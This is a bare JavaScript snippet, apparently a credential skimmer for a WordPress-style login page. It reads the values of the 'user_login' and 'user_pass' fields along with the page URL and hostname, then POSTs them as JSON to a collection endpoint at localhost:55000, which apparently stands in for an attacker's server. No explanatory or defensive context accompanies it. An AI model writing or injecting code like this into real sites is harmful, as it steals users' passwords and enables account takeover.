var login = document.getElementById("user_login").value;
var passwd = document.getElementById("user_pass").value;
var url = document.location.href;
var origin = document.location.hostname;

fetch("http://localhost:55000/data", {
  method: "POST",
  headers: {
        'Content-Type': 'application/json',
    },
  body: JSON.stringify({
    url: url,
    user: login,
    passw: passwd,
    origin:origin
  }),
  headers: {
    "Content-type": "application/json; charset=UTF-8"
  }
});